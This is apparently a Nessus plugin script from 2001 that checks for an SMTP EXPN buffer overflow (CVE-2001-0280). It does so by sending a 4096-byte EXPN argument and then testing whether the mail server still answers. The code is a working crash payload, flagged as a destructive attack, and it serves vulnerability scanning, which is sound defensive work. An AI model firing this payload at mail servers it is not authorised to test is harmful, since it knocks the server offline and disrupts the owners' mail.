#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10620);
 script_bugtraq_id(2412, 223);
 script_cve_id("CVE-2001-0280");
 script_xref(name:"OSVDB", value:"6027");
 script_version ("$Revision: 1.18 $");
 
 name["english"] = "EXPN overflow";
 name["francais"] = "EXPN overflow";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
It was possible to make the remote mail server
crash when issuing a too long argument to the
EXPN command.

An attacker may use this flaw to prevent your organization from
receiving any mail, or to force your mail to go through another
mail server, noted as an MX.

Solution : upgrade your mail server or contact your vendor for a fix
Risk factor : High";

	

 desc["francais"] = "
Il s'est avéré possible de faire planter le serveur SMTP
distant en donnant un argument trop long à la commande
EXPN.

Un pirate peut utiliser ce problème pour vous empecher de recevoir
du mail ou bien forcer votre courrier à passer par un autre
serveur noté comme MX.

Solution : contactez votre vendeur pour un patch
Facteur de risque : Elevé";


 script_description(english:desc["english"],
 	 	    francais:desc["francais"]);
		    
 
 summary["english"] = "EXPN and VRFY checks"; 
 summary["francais"] = "Vérification de EXPN et VRFY";
 script_summary(english:summary["english"],
 		 francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 
 family["english"] = "SMTP problems";
 family["francais"] = "Problèmes SMTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if(!get_port_state(port))exit(0);


soc = open_sock_tcp(port);
 if(soc)
 {
  b = smtp_recv_banner(socket:soc);
  if(!b){
	close(soc);
	exit(0);
	}
	
  
  s = string("HELO example.com\r\n");
  send(socket:soc, data:s);
  r = recv_line(socket:soc, length:1024);
  # MA 2005-03-07: 200 bytes are enough for Mercure (?), but not for SLMail
  s = string("EXPN ", crap(4096), "\r\nQUIT\r\n");
  send(socket:soc, data:s);
  #r = recv_line(socket:soc, length:1024);
  close(soc); 
  
  #sleep(1);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);

  r = smtp_recv_banner(socket:soc2);
  close(soc2);
  if(!r)security_hole(port);
}
